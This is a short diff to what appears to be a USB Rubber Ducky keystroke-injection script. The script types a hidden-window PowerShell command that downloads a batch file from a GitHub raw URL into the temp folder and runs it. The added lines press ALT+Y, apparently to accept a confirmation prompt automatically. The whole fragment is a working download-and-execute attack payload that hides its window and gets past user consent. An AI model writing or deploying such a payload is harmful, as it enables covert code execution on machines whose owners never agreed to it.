@@ -4,3 +4,5 @@ DELAY 200
 STRING powershell /NoProfile /NoLogo /Windowstyle hidden /Command "iwr https://raw.githubusercontent.com/Naggelus/autoDuck/master/autoDuck.bat -OutFile $env:TEMP\autoDuck.bat; start $env:TEMP\autoDuck.bat"
 DELAY 200
 ENTER
+DELAY 1000
+ALT Y
